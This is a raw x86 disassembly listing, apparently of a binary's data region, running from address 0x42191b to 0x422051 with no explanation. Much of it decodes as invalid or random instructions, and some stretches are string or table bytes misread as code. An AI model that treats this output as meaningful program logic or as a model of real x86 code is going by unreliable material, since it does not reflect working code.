  42191b:	sar    dh,1
  42191d:	inc    esp
  42191e:	mov    ds:0x72861de2,al
  421923:	out    dx,eax
  421924:	jle    0x4218dc
  421926:	repnz adc al,0x71
  421929:	adc    eax,0x5825151e
  42192e:	mov    WORD PTR [edx],ds
  421930:	cdq    
  421931:	push   ebx
  421932:	jno    0x42191a
  421934:	sar    ch,1
  421936:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421937:	add    eax,0x152b533d
  42193c:	hlt    
  42193d:	sti    
  42193e:	mov    ecx,0x725fc4ad
  421943:	cmp    eax,edx
  421945:	jnp    0x42191c
  421947:	dec    edx
  421948:	mov    cl,bl
  42194a:	cwde   
  42194b:	int3   
  42194c:	jecxz  0x421954
  42194e:	jp     0x42190d
  421950:	inc    ecx
  421951:	(bad)  
  421953:	add    eax,0x26297570
  421958:	mov    ebx,0xf6ee325c
  42195d:	push   ebx
  42195e:	jne    0x42194d
  421960:	cs inc edx
  421962:	imul   ebp,DWORD PTR [esi+0x3c823b83],0xffffff8e
  421969:	add    BYTE PTR [eax],al
  42196b:	add    BYTE PTR [eax],al
  42196d:	add    bl,al
  42196f:	or     eax,0xefee66a6
  421974:	ret    
  421975:	lods   eax,DWORD PTR ds:[esi]
  421976:	sub    al,0xb8
  421978:	mov    ds:0x7ad3ef47,eax
  42197d:	inc    ebx
  42197e:	in     eax,0xe3
  421980:	add    DWORD PTR [eax],eax
  421982:	arpl   WORD PTR [eax],ax
  421984:	add    BYTE PTR [eax],al
  421986:	mov    es,ecx
  421988:	aam    0x58
  42198a:	(bad)  
  42198b:	fisttp QWORD PTR [ebx+0x53]
  42198e:	sti    
  42198f:	loop   0x421932
  421991:	sub    eax,0x2922e510
  421996:	jmp    0x1d97:0xb7a9293e
  42199d:	pop    ebp
  42199e:	mov    ebx,0x4f38f532
  4219a3:	pushf  
  4219a4:	inc    edx
  4219a5:	(bad)  
  4219a6:	in     al,dx
  4219a7:	(bad)  [ebx]
  4219a9:	stc    
  4219aa:	std    
  4219ab:	or     bh,ah
  4219ad:	inc    esp
  4219ae:	loopne 0x42193c
  4219b0:	cs pusha 
  4219b2:	cs push ebx
  4219b4:	or     DWORD PTR [ebx],edx
  4219b6:	pop    ecx
  4219b7:	jae    0x4219f7
  4219b9:	dec    esi
  4219ba:	pusha  
  4219bb:	(bad)  
  4219bc:	(bad)  
  4219bd:	in     eax,0x65
  4219bf:	std    
  4219c0:	push   edi
  4219c1:	pop    eax
  4219c2:	data16 fisttp DWORD PTR [ebp+0x18648ff9]
  4219c9:	les    esi,FWORD PTR [ecx+0x59a8640]
  4219cf:	xchg   esp,eax
  4219d0:	xor    esi,0xfffffffb
  4219d3:	jle    0x4219f6
  4219d5:	pop    edx
  4219d6:	mov    ebx,0x89666b7e
  4219dc:	mov    esp,0xb62a964b
  4219e1:	inc    ebx
  4219e2:	lahf   
  4219e3:	shr    DWORD PTR [esi+0x2c76d7a3],cl
  4219e9:	add    BYTE PTR [eax],al
  4219eb:	add    BYTE PTR [eax],al
  4219ed:	add    cl,bl
  4219ef:	ret    0x4905
  4219f2:	pop    ds
  4219f3:	iret   
  4219f4:	fst    st(2)
  4219f6:	enter  0xf86f,0xd2
  4219fa:	ja     0x421a04
  4219fc:	mov    ds:0x1e44880,al
  421a01:	add    BYTE PTR [ebp+0x0],al
  421a04:	add    BYTE PTR [eax],al
  421a06:	adc    edx,ebp
  421a08:	jge    0x4219d1
  421a0a:	sar    BYTE PTR [edx+0x3a4c6b8c],1
  421a10:	or     cl,al
  421a12:	pushf  
  421a13:	sahf   
  421a14:	mov    ch,0x38
  421a16:	ja     0x4219aa
  421a18:	pop    ss
  421a19:	fs xchg esi,eax
  421a1b:	xchg   BYTE PTR [edx],bh
  421a1d:	lods   al,BYTE PTR ds:[esi]
  421a1e:	and    eax,0x2daac670
  421a23:	in     al,dx
  421a24:	rcr    DWORD PTR [esi-0x31],0xc9
  421a28:	popf   
  421a29:	faddp  st(1),st
  421a2b:	sbb    ebp,ebx
  421a2d:	jnp    0x421a7e
  421a2f:	adc    al,0xd5
  421a31:	xchg   esi,eax
  421a32:	inc    esi
  421a33:	aas    
  421a34:	xchg   DWORD PTR [eax+0x70],eax
  421a37:	test   eax,0xe76d5975
  421a3c:	inc    eax
  421a3d:	mov    eax,0xc1c52857
  421a42:	pop    edx
  421a43:	xchg   cl,cl
  421a45:	xchg   ebp,eax
  421a46:	fisttp WORD PTR [esi+ecx*1+0xd24]
  421a4d:	add    BYTE PTR [eax],al
  421a4f:	nop
  421a50:	inc    edx
  421a51:	add    BYTE PTR [eax+edx*4],al
  421a54:	inc    edx
  421a55:	add    BYTE PTR [eax],cl
  421a57:	nop
  421a58:	inc    edx
  421a59:	add    BYTE PTR [eax+edx*4],cl
  421a5c:	inc    edx
  421a5d:	add    BYTE PTR [eax],dl
  421a5f:	nop
  421a60:	inc    edx
  421a61:	add    BYTE PTR [eax+edx*4],dl
  421a64:	inc    edx
  421a65:	add    BYTE PTR [eax],bl
  421a67:	nop
  421a68:	inc    edx
  421a69:	add    BYTE PTR [eax+edx*4],bl
  421a6c:	inc    edx
  421a6d:	add    BYTE PTR [eax],al
  421a6f:	mov    al,ds:0xa0040042
  421a74:	inc    edx
  421a75:	add    BYTE PTR [eax],cl
  421a77:	mov    al,ds:0xa00c0042
  421a7c:	inc    edx
  421a7d:	add    BYTE PTR [eax],dl
  421a7f:	mov    al,ds:0xa0140042
  421a84:	inc    edx
  421a85:	add    BYTE PTR [eax],bl
  421a87:	mov    al,ds:0xa01c0042
  421a8c:	inc    edx
  421a8d:	add    BYTE PTR [eax],al
  421a8f:	mov    al,0x42
  421a91:	add    BYTE PTR [eax+esi*4],al
  421a94:	inc    edx
  421a95:	add    BYTE PTR [eax],cl
  421a97:	mov    al,0x42
  421a99:	add    BYTE PTR [eax+esi*4],cl
  421a9c:	inc    edx
  421a9d:	add    BYTE PTR [eax],dl
  421a9f:	mov    al,0x42
  421aa1:	add    BYTE PTR [eax+esi*4],dl
  421aa4:	inc    edx
  421aa5:	add    BYTE PTR [eax],bl
  421aa7:	mov    al,0x42
  421aa9:	add    BYTE PTR [eax+esi*4],bl
  421aac:	inc    edx
  421aad:	add    BYTE PTR [eax+0x66],bh
  421ab0:	ins    BYTE PTR es:[edi],dx
  421ab1:	jp     0x421b0a
  421ab3:	jbe    0x421afc
  421ab5:	ja     0x421afa
  421ab7:	js     0x421b01
  421ab9:	jno    0x421b1e
  421abb:	inc    edx
  421abc:	inc    bx
  421abe:	push   ebp
  421abf:	jno    0x421b37
  421ac1:	ja     0x421b2a
  421ac3:	dec    edi
  421ac4:	dec    esp
  421ac5:	dec    ebp
  421ac6:	inc    edx
  421ac7:	jno    0x421b3a
  421ac9:	jae    0x421b1e
  421acb:	push   eax
  421acc:	arpl   WORD PTR [ebx+0x76],dx
  421acf:	push   ds
  421ad0:	inc    edx
  421ad1:	add    BYTE PTR [esi+0x1e],bh
  421ad4:	inc    edx
  421ad5:	add    BYTE PTR [esi],dl
  421ad7:	sbb    eax,0xbef0042
  421adc:	mov    dl,0xe
  421ade:	jns    0x421b2e
  421ae0:	xor    BYTE PTR [esi-0x79],cl
  421ae3:	dec    edi
  421ae4:	cmp    eax,0x3e4faf4e
  421ae9:	dec    esi
  421aea:	js     0x421b3a
  421aec:	cmp    ecx,DWORD PTR [esi-0x64]
  421aef:	dec    edi
  421af0:	inc    esp
  421af1:	dec    esi
  421af2:	jae    0x421b42
  421af4:	inc    ecx
  421af5:	dec    esi
  421af6:	xor    BYTE PTR [esi+0x40],cl
  421af9:	dec    esi
  421afa:	pop    esp
  421afb:	pop    ebp
  421afc:	pop    edi
  421afd:	push   edx
  421afe:	cmp    DWORD PTR [esi+0x79],ecx
  421b01:	dec    esi
  421b02:	xor    BYTE PTR [esi-0x79],cl
  421b05:	dec    edi
  421b06:	cmp    eax,0x3e4faf4e
  421b0b:	dec    esi
  421b0c:	js     0x421b5c
  421b0e:	cmp    ecx,DWORD PTR [esi-0x64]
  421b11:	dec    edi
  421b12:	inc    esp
  421b13:	dec    esi
  421b14:	mov    DWORD PTR [edi+0x41],ecx
  421b17:	dec    esi
  421b18:	xor    BYTE PTR [esi+0x40],cl
  421b1b:	dec    esi
  421b1c:	pop    esp
  421b1d:	ins    DWORD PTR es:[edi],dx
  421b1e:	pop    edi
  421b1f:	bound  edi,QWORD PTR [ecx]
  421b21:	dec    esi
  421b22:	jns    0x421b72
  421b24:	xor    BYTE PTR [esi-0x80],cl
  421b27:	dec    edi
  421b28:	cmp    eax,0x394e734e
  421b2d:	dec    esi
  421b2e:	mov    ds:0x304e3a4f,al
  421b33:	dec    esi
  421b34:	inc    esi
  421b35:	dec    esi
  421b36:	pop    esp
  421b37:	jge    0x421b98
  421b39:	jb     0x421baa
  421b3b:	sub    BYTE PTR [esi-0x7d],0x7e
  421b3f:	xchg   ebx,eax
  421b40:	jns    0x421ad2
  421b42:	aas    
  421b43:	dec    esi
  421b44:	test   BYTE PTR [edi+0x30],cl
  421b47:	dec    esi
  421b48:	test   BYTE PTR [edi+0x3c],cl
  421b4b:	dec    esi
  421b4c:	mov    ds:0x734e394f,al
  421b51:	dec    esi
  421b52:	inc    ebp
  421b53:	dec    esi
  421b54:	xor    BYTE PTR [esi+0x44],cl
  421b57:	dec    esi
  421b58:	pop    esp
  421b59:	lea    ebx,[edi-0x7e]
  421b5c:	outs   dx,DWORD PTR ds:[esi]
  421b5d:	xchg   edx,eax
  421b5e:	outs   dx,BYTE PTR ds:[esi]
  421b5f:	xchg   ebx,eax
  421b60:	jle    0x421b05
  421b62:	jns    0x421b04
  421b64:	aas    
  421b65:	dec    esi
  421b66:	test   BYTE PTR [edi+0x30],cl
  421b69:	dec    esi
  421b6a:	test   BYTE PTR [edi+0x3c],cl
  421b6d:	dec    esi
  421b6e:	mov    ds:0x894e394f,al
  421b73:	dec    edi
  421b74:	inc    ebp
  421b75:	dec    esi
  421b76:	xor    BYTE PTR [esi+0x44],cl
  421b79:	dec    esi
  421b7a:	pop    esp
  421b7b:	popf   
  421b7c:	pop    edi
  421b7d:	xchg   edx,eax
  421b7e:	outs   dx,DWORD PTR ds:[esi]
  421b7f:	mov    ds:0xb37ea36e,al
  421b84:	jns    0x421b36
  421b86:	aas    
  421b87:	dec    esi
  421b88:	mov    cs,WORD PTR [edi+0x30]
  421b8b:	dec    esi
  421b8c:	lods   al,BYTE PTR ds:[esi]
  421b8d:	dec    edi
  421b8e:	cmp    eax,0x394e734e
  421b93:	dec    esi
  421b94:	mov    eax,ds:0x304e3a4f
  421b99:	dec    esi
  421b9a:	inc    esp
  421b9b:	dec    esi
  421b9c:	pop    esp
  421b9d:	lods   eax,DWORD PTR ds:[esi]
  421b9e:	pop    edi
  421b9f:	mov    ds:0xb36eb26f,al
  421ba4:	jle    0x421b69
  421ba6:	jns    0x421b68
  421ba8:	aas    
  421ba9:	dec    esi
  421baa:	mov    cs,WORD PTR [edi+0x30]
  421bad:	dec    esi
  421bae:	lods   al,BYTE PTR ds:[esi]
  421baf:	dec    edi
  421bb0:	cmp    eax,0x394e7e4e
  421bb5:	dec    esi
  421bb6:	lahf   
  421bb7:	dec    edi
  421bb8:	cmp    ecx,DWORD PTR [esi+0x30]
  421bbb:	dec    esi
  421bbc:	inc    ebp
  421bbd:	dec    esi
  421bbe:	pop    esp
  421bbf:	mov    ebp,0xc26fb25f
  421bc4:	outs   dx,BYTE PTR ds:[esi]
  421bc5:	ret    
  421bc6:	jle    0x421b9b
  421bc8:	jns    0x421b9a
  421bca:	aas    
  421bcb:	dec    esi
  421bcc:	mov    cs,WORD PTR [edi+0x30]
  421bcf:	dec    esi
  421bd0:	lods   al,BYTE PTR ds:[esi]
  421bd1:	dec    edi
  421bd2:	cmp    eax,0x394f804e
  421bd7:	dec    esi
  421bd8:	lods   al,BYTE PTR ds:[esi]
  421bd9:	dec    edi
  421bda:	cmp    cl,BYTE PTR [esi+0x30]
  421bdd:	dec    esi
  421bde:	inc    esi
  421bdf:	dec    esi
  421be0:	pop    esp
  421be1:	int    0x5f
  421be3:	ret    0xd26f
  421be6:	outs   dx,BYTE PTR ds:[esi]
  421be7:	sar    DWORD PTR [esi-0x1d],cl
  421bea:	jns    0x421bcc
  421bec:	aas    
  421bed:	dec    esi
  421bee:	mov    cs,WORD PTR [edi+0x30]
  421bf1:	dec    esi
  421bf2:	lods   al,BYTE PTR ds:[esi]
  421bf3:	dec    edi
  421bf4:	cmp    eax,0x394f834e
  421bf9:	dec    esi
  421bfa:	mov    ds:0x304e3a4f,al
  421bff:	dec    esi
  421c00:	inc    esp
  421c01:	dec    esi
  421c02:	pop    esp
  421c03:	fstp   QWORD PTR [edi-0x2e]
  421c06:	outs   dx,DWORD PTR ds:[esi]
  421c07:	loop   0x421c77
  421c09:	jecxz  0x421c89
  421c0b:	repz jns 0x421bfe
  421c0e:	aas    
  421c0f:	dec    esi
  421c10:	lea    ecx,[edi+0x30]
  421c13:	dec    esi
  421c14:	lahf   
  421c15:	dec    edi
  421c16:	cmp    eax,0x3c4fa04e
  421c1b:	dec    esi
  421c1c:	xor    BYTE PTR [esi+0x3f],cl
  421c1f:	dec    esi
  421c20:	pop    esp
  421c21:	in     eax,dx
  421c22:	pop    edi
  421c23:	loop   0x421c94
  421c25:	repnz outs dx,BYTE PTR ds:[esi]
  421c27:	repz jle 0x421c2d
  421c2a:	jns    0x421c2c
  421c2c:	jle    0x421c41
  421c2e:	jns    0x421c40
  421c30:	cmp    al,0x4e
  421c32:	jg     0x421c82
  421c34:	xor    BYTE PTR [esi-0x65],cl
  421c37:	dec    edi
  421c38:	xor    cl,BYTE PTR [esi-0x80]
  421c3b:	dec    edi
  421c3c:	cmp    al,0x4e
  421c3e:	lods   eax,DWORD PTR ds:[esi]
  421c3f:	dec    edi
  421c40:	cmp    ecx,DWORD PTR [esi+0x30]
  421c43:	dec    esi
  421c44:	inc    ebp
  421c45:	dec    esi
  421c46:	pop    esp
  421c47:	or     eax,0x126f025f
  421c4c:	outs   dx,BYTE PTR ds:[esi]
  421c4d:	adc    edi,DWORD PTR [esi+0x23]
  421c50:	jns    0x421c72
  421c52:	aas    
  421c53:	dec    esi
  421c54:	add    BYTE PTR [eax],al
  421c56:	ficomp WORD PTR [edx]
  421c58:	inc    edx
  421c59:	add    dl,dl
  421c5b:	sbb    al,0x42
  421c5d:	add    dl,bl
  421c5f:	sbb    al,0x42
  421c61:	add    BYTE PTR [edx-0x11ffbde2],al
  421c67:	sbb    eax,0x1e720042
  421c6c:	inc    edx
  421c6d:	add    BYTE PTR [edx-0x41ffbde4],bh
  421c73:	sbb    al,0x42
  421c75:	add    BYTE PTR [esi+0x1e],ch
  421c78:	inc    edx
  421c79:	add    BYTE PTR [edx],ah
  421c7b:	sbb    eax,0xa90d0042
  421c80:	pushf  
  421c81:	clc    
  421c82:	ss mov edx,0x1cd6f89c
  421c88:	inc    edx
  421c89:	add    BYTE PTR [esi-0x45ffbde3],ah
  421c8f:	sbb    eax,0x1dc60042
  421c94:	inc    edx
  421c95:	add    dh,dl
  421c97:	sbb    eax,0x1d0e0042
  421c9c:	inc    edx
  421c9d:	add    dl,bl
  421c9f:	sbb    al,BYTE PTR [edx+0x0]
  421ca2:	cs sbb eax,0x1d1e0042
  421ca8:	inc    edx
  421ca9:	add    BYTE PTR [esi-0x49ffbde2],al
  421caf:	test   DWORD PTR [eax+edi*8-0x7ee8f4e7],ebx
  421cb6:	loop   0x421cd4
  421cb8:	inc    edx
  421cb9:	add    BYTE PTR [esp+ebx*1],dl
  421cbc:	push   ss
  421cbd:	or     DWORD PTR [eax],0x7050d
  421cc3:	add    BYTE PTR [eax+0x0],al
  421cc6:	cmp    al,BYTE PTR [edx+0x3e]
  421cc9:	ds enter 0x4279,0x0
  421cce:	ins    DWORD PTR es:[edi],dx
  421ccf:	push   ebp
  421cd0:	inc    esp
  421cd1:	imul   ecx,DWORD PTR [eax],0x86275fa
  421cd7:	in     eax,dx
  421cd8:	inc    BYTE PTR [edi]
  421cda:	aas    
  421cdb:	cli    
  421cdc:	mov    ds:0x421cca05,eax
  421ce1:	add    BYTE PTR [ebp-0x4a07636b],dh
  421ce7:	xchg   esi,eax
  421ce8:	pushf  
  421ce9:	clc    
  421cea:	mov    ah,0x95
  421cec:	pushf  
  421ced:	clc    
  421cee:	mov    ebx,0xbaf89c95
  421cf3:	xchg   ebp,eax
  421cf4:	pushf  
  421cf5:	clc    
  421cf6:	mov    ecx,0xb8f89c95
  421cfb:	xchg   ebp,eax
  421cfc:	pushf  
  421cfd:	clc    
  421cfe:	mov    edi,0xbef89c95
  421d03:	xchg   ebp,eax
  421d04:	pushf  
  421d05:	clc    
  421d06:	mov    ebp,0xa6f89c95
  421d0b:	xchg   ebp,eax
  421d0c:	pushf  
  421d0d:	clc    
  421d0e:	jmp    0x421a:0xd26003f9
  421d15:	add    BYTE PTR [eax+eax*2+0x42],ch
  421d19:	add    BYTE PTR [ebx+0x77],dl
  421d1c:	jbe    0x421d6e
  421d1e:	mov    dh,0x85
  421d20:	pushf  
  421d21:	clc    
  421d22:	sbb    ecx,ebp
  421d24:	push   eax
  421d25:	pop    es
  421d26:	sbb    BYTE PTR [ebx],cl
  421d28:	add    BYTE PTR [eax],al
  421d2a:	into   
  421d2b:	sbb    al,BYTE PTR [edx+0x0]
  421d2e:	sbb    ecx,DWORD PTR [ebx]
  421d30:	add    al,0xe
	...
  421d62:	ins    BYTE PTR es:[edi],dx
  421d63:	inc    eax
  421d64:	inc    edx
  421d65:	add    BYTE PTR [esi+0x66f89c85],dh
  421d6b:	add    BYTE PTR [edx+0x0],ch
  421d6e:	add    BYTE PTR [si+0x0],ah
  421d72:	push   0x64006700
  421d77:	add    BYTE PTR [esi+0x0],ah
  421d7a:	push   0x0
  421d7c:	push   0x66006400
  421d81:	add    BYTE PTR [edi+0x0],ah
  421d84:	push   0x0
  421d86:	push   0x66006700
  421d8b:	add    BYTE PTR [eax+0x0],ch
  421d8e:	add    BYTE PTR [bp+0x0],ah
  421d92:	push   0x66006700
	...
  421d9f:	add    BYTE PTR [eax],al
  421da1:	add    BYTE PTR [ecx-0x5affbfa4],cl
  421da7:	dec    edi
  421da8:	lahf   
  421da9:	dec    edi
  421daa:	mov    ds:0x9f4fa64f,al
  421daf:	dec    edi
  421db0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421db1:	dec    edi
  421db2:	ins    DWORD PTR es:[edi],dx
  421db3:	dec    esi
  421db4:	bound  ecx,QWORD PTR [esi+0x30]
  421db7:	dec    esi
  421db8:	add    BYTE PTR [eax],al
  421dba:	cdq    
  421dbb:	dec    edi
  421dbc:	pushf  
  421dbd:	dec    edi
  421dbe:	fwait
  421dbf:	dec    edi
  421dc0:	ins    DWORD PTR es:[edi],dx
  421dc1:	dec    esi
  421dc2:	bound  ecx,QWORD PTR [esi+0x30]
  421dc5:	dec    esi
  421dc6:	scas   eax,DWORD PTR es:[edi]
  421dc7:	dec    edi
  421dc8:	lods   eax,DWORD PTR ds:[esi]
  421dc9:	dec    edi
  421dca:	lahf   
  421dcb:	dec    edi
  421dcc:	mov    ds:0x624e6d4f,al
  421dd1:	dec    esi
  421dd2:	xor    BYTE PTR [esi+0x0],cl
  421dd5:	add    BYTE PTR [ebp-0x5bb067b1],ch
  421ddb:	dec    edi
  421ddc:	test   eax,0xa04f934f
  421de1:	dec    edi
  421de2:	fwait
  421de3:	dec    edi
  421de4:	xor    BYTE PTR [esi+0x0],cl
  421de7:	add    BYTE PTR [eax],al
  421de9:	add    BYTE PTR [eax],al
  421deb:	add    BYTE PTR [eax],al
  421ded:	add    BYTE PTR [ebp+edi*2-0x62737274],cl
  421df4:	mov    WORD PTR [ebp-0x32734274],gs
  421dfa:	mov    ebp,ds
  421dfc:	mov    ebp,gs
  421dfe:	mov    ebp,?
  421e00:	mov    WORD PTR ds:0x2d8c1d8c,cs
  421e06:	mov    WORD PTR ds:0x6d8c5d8c,?
  421e0c:	mov    WORD PTR [edx-0x74],?
  421e0f:	jae    0x421d9d
  421e11:	jo     0x421d9f
  421e13:	jno    0x421da1
  421e15:	jbe    0x421da3
  421e17:	ja     0x421da5
  421e19:	je     0x421da7
  421e1b:	jne    0x421da9
  421e1d:	mov    cl,BYTE PTR [ebx+ecx*4-0x76737774]
  421e24:	mov    WORD PTR [esi+0x7d9c7c8c],cs
  421e2a:	lods   al,BYTE PTR ds:[esi]
  421e2b:	jge    0x421de9
  421e2d:	jge    0x421dcd
  421e2f:	(bad)  
  421e30:	jns    0x421ea5
  421e32:	mov    ecx,0x7d738cb1
  421e37:	ins    DWORD PTR es:[edi],dx
  421e38:	enter  0x9fc6,0x26
  421e3c:	jb     0x421e41
  421e3e:	test   eax,0xb956bb17
  421e43:	hlt    
  421e44:	test   al,0x37
  421e46:	test   al,0x7e
  421e48:	fnstenv [ecx-0x6a]
  421e4b:	mov    cl,0x6a
  421e4d:	push   0xffffffce
  421e4f:	or     BYTE PTR [edx],bl
  421e51:	xlat   BYTE PTR ds:[ebx]
  421e52:	out    dx,eax
  421e53:	add    eax,0x9321d7aa
  421e58:	scas   al,BYTE PTR es:[edi]
  421e59:	adc    DWORD PTR [esi],esp
  421e5b:	jge    0x421e80
  421e5d:	fidiv  WORD PTR [edi]
  421e5f:	leave  
  421e60:	hlt    
  421e61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e62:	cmp    ax,0x1fc8
  421e66:	mov    dh,cl
  421e68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e69:	(bad)  
  421e6a:	and    DWORD PTR [eax],ebx
  421e6c:	and    DWORD PTR [ecx-0x18],esi
  421e6f:	(bad)  [ebx+0x7]
  421e72:	cmc    
  421e73:	enter  0x301a,0x14
  421e77:	inc    eax
  421e78:	inc    edx
  421e79:	add    BYTE PTR [ecx+0x66],dh
  421e7c:	jp     0x421eec
  421e7e:	ret    0x421c
  421e81:	add    BYTE PTR [esi],ah
  421e83:	sbb    eax,0xed080042
  421e88:	adc    al,BYTE PTR [edi]
  421e8a:	imul   esp,DWORD PTR [esi+0x4f],0x6f704c74
  421e91:	ins    BYTE PTR es:[edi],dx
  421e92:	push   0x49657557
  421e97:	imul   eax,DWORD PTR fs:[ecx+edi*2+0x54],0x62
  421e9d:	push   edi
  421e9e:	jp     0x421f1a
  421ea0:	dec    ebp
  421ea1:	push   esi
  421ea2:	arpl   WORD PTR gs:[ecx+0x45],si
  421ea6:	dec    edx
  421ea7:	dec    esi
  421ea8:	data16 ja 0x421ef9
  421eab:	imul   ebp,DWORD PTR [eax+0x6e],0x76597148
	...
  421ec6:	inc    ebp
  421ec7:	push   edx
  421ec8:	jb     0x421f3e
  421eca:	inc    esi
  421ecb:	je     0x421f0e
  421ecd:	inc    esi
  421ece:	jae    0x421f46
  421ed0:	dec    ebx
  421ed1:	gs dec ecx
  421ed3:	dec    ebp
  421ed4:	dec    ebp
  421ed5:	pop    edx
  421ed6:	jp     0x421f32
  421ed8:	jbe    0x421f20
  421eda:	pop    ecx
  421edb:	jo     0x421f55
  421edd:	inc    edi
  421ede:	gs ins BYTE PTR es:[edi],dx
  421ee0:	dec    esp
  421ee1:	js     0x421f4b
  421ee3:	inc    edx
  421ee4:	js     0x421f2c
  421ee6:	dec    eax
  421ee7:	inc    ebp
  421ee8:	inc    esp
  421ee9:	inc    esp
  421eea:	push   ecx
  421eeb:	dec    edx
  421eec:	ins    BYTE PTR es:[edi],dx
  421eed:	dec    ebx
  421eee:	jbe    0x421f5e
  421ef0:	pop    eax
  421ef1:	jbe    0x421f3e
  421ef3:	inc    ecx
  421ef4:	fs gs jno 0x421f65
  421ef8:	push   ebx
  421ef9:	inc    ecx
  421efa:	add    BYTE PTR [eax],al
  421efc:	inc    ebx
  421efd:	outs   dx,BYTE PTR ds:[esi]
  421efe:	imul   esp,DWORD PTR [edi+0x7a],0x6f
  421f02:	push   edx
  421f03:	push   ecx
  421f04:	push   0x74000064
  421f09:	jne    0x421f80
  421f0b:	ins    DWORD PTR es:[edi],dx
  421f0c:	push   ecx
  421f0d:	push   eax
  421f0e:	jo     0x421f8a
  421f10:	addr16 jo 0x421f69
  421f13:	pop    eax
  421f14:	add    BYTE PTR [eax],al
  421f16:	push   ecx
  421f17:	pop    ecx
  421f18:	inc    ebx
  421f19:	inc    edx
  421f1a:	outs   dx,BYTE PTR ds:[esi]
  421f1b:	popa   
  421f1c:	imul   eax,DWORD PTR [edx+0x61],0x6b
  421f20:	jne    0x421f90
  421f22:	dec    ebx
  421f23:	je     0x421f88
  421f25:	bound  esp,QWORD PTR [edi+0x0]
  421f28:	jns    0x421f6f
  421f2a:	bound  ebp,QWORD PTR [ecx+0x46]
  421f2d:	dec    ecx
  421f2e:	ja     0x421f75
  421f30:	dec    eax
  421f31:	inc    ebp
  421f32:	inc    edx
  421f33:	push   ebx
  421f34:	add    BYTE PTR [eax],al
  421f36:	outs   dx,DWORD PTR ds:[esi]
  421f37:	inc    edi
  421f38:	dec    esi
  421f39:	outs   dx,DWORD PTR ds:[esi]
  421f3a:	pop    ecx
  421f3b:	inc    edi
  421f3c:	jb     0x421f85
  421f3e:	jns    0x421fb6
  421f40:	inc    ecx
  421f41:	pop    eax
  421f42:	dec    esp
  421f43:	add    BYTE PTR [eax+0x48],bh
  421f46:	bound  edx,QWORD PTR [ebx+0x43]
  421f49:	pop    eax
  421f4a:	outs   dx,DWORD PTR ds:[esi]
  421f4b:	push   0x4355
  421f50:	dec    esp
  421f51:	ins    BYTE PTR es:[edi],dx
  421f52:	inc    edx
  421f53:	push   0x76666a73
  421f58:	inc    edx
  421f59:	jo     0x421f5b
  421f5b:	add    BYTE PTR [eax],al
  421f5d:	add    BYTE PTR [edi+0x6d],ah
  421f60:	je     0x421fa9
  421f62:	ins    BYTE PTR es:[edi],dx
  421f63:	jae    0x421fcf
  421f65:	inc    esi
  421f66:	ins    DWORD PTR es:[edi],dx
  421f67:	je     0x421fbf
  421f69:	push   0x56584178
  421f6e:	push   ebx
  421f6f:	addr16 dec edx
  421f71:	jo     0x421fe5
  421f73:	js     0x421fe4
  421f75:	pop    eax
  421f76:	dec    ebx
  421f77:	push   esp
  421f78:	dec    esp
  421f79:	jns    0x421fc6
  421f7b:	js     0x421ff5
  421f7d:	outs   dx,BYTE PTR ds:[esi]
  421f7e:	pop    ecx
  421f7f:	jae    0x421fef
  421f81:	push   0x43644448
  421f86:	arpl   WORD PTR [edx+0x55],sp
  421f89:	push   0x42504e67
  421f8e:	push   ebp
  421f8f:	je     0x422006
  421f91:	addr16 dec edi
  421f93:	dec    esp
  421f94:	inc    edx
  421f95:	ins    DWORD PTR es:[edi],dx
  421f96:	inc    esi
  421f97:	inc    esi
  421f98:	inc    esi
  421f99:	arpl   WORD PTR [edx+0x47],bx
  421f9c:	push   ebp
  421f9d:	inc    ebx
  421f9e:	popa   
  421f9f:	push   edx
  421fa0:	dec    esp
  421fa1:	imul   ecx,DWORD PTR [ecx+0x43],0x54706a5a
  421fa8:	push   ecx
  421fa9:	push   ebx
  421faa:	imul   ebp,DWORD PTR [ebx+0x52],0x444a454e
  421fb1:	dec    edx
  421fb2:	jns    0x42201d
  421fb4:	push   edx
  421fb5:	inc    ebx
  421fb6:	jo     0x42202d
  421fb8:	imul   ecx,DWORD PTR [ebx+0x50],0x48
  421fbc:	fs push ebx
  421fbe:	inc    ebx
  421fbf:	push   ebp
  421fc0:	push   eax
  421fc1:	ja     0x421ffe
  421fc3:	fisttp QWORD PTR [ebp+ebp*4-0x12]
  421fc7:	mov    ebp,0xa53ddffb
  421fcc:	js     0x421f87
  421fce:	(bad)  
  421fcf:	or     al,0xdd
  421fd1:	add    ah,BYTE PTR [edx]
  421fd3:	xlat   BYTE PTR ds:[ebx]
  421fd4:	add    DWORD PTR [eax],eax
  421fd6:	arpl   WORD PTR [eax],ax
  421fd8:	add    BYTE PTR [eax],al
  421fda:	jnp    0x421fe2
  421fdc:	pop    eax
  421fdd:	add    ah,BYTE PTR [eax]
  421fdf:	out    dx,al
  421fe0:	int    0x9e
  421fe2:	or     DWORD PTR [edx-0x550fcf7a],esi
  421fe8:	dec    edi
  421fe9:	fidivr DWORD PTR [eax+0x68]
  421fec:	loop   0x422006
  421fee:	add    dh,BYTE PTR [edx+0x1fe024d0]
  421ff4:	inc    esp
  421ff5:	or     eax,0x2fa8f5e1
  421ffa:	fisubr WORD PTR [esi+0xc]
  421ffd:	cmp    BYTE PTR ds:0xf1929fcb,bh
  422003:	and    al,0x7e
  422005:	add    DWORD PTR [edi],edx
  422007:	out    dx,eax
  422008:	and    dl,cl
  42200a:	or     bl,ch
  42200c:	arpl   cx,dx
  42200e:	out    dx,al
  42200f:	cmp    BYTE PTR [edi+esi*1-0x20],0x47
  422014:	fld    TBYTE PTR [ebp+0x72]
  422017:	adc    al,0xec
  422019:	push   0xa76d024
  42201e:	(bad)  
  42201f:	(bad)  
  422020:	bnd ds jne 0x422086
  422024:	xchg   edx,eax
  422025:	xchg   ebx,eax
  422026:	in     al,0x9e
  422028:	sbb    BYTE PTR [edx+0x46b163f1],ah
  42202e:	add    eax,0x21ab3709
  422033:	repz (bad) 
  422035:	int    0xbb
  422037:	fnsave [esi-0x11a6e411]
  42203d:	add    BYTE PTR [eax],al
  42203f:	add    BYTE PTR [eax],al
  422041:	add    BYTE PTR [eax],ch
  422043:	mov    dl,0xa5
  422045:	push   edx
  422046:	mov    edi,0x7cfaff57
  42204b:	xlat   BYTE PTR fs:[ebx]
  42204d:	push   esi
  42204e:	(bad)  
  42204f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422051:	test   DWORD PTR [ebp+0x630001d7],eax
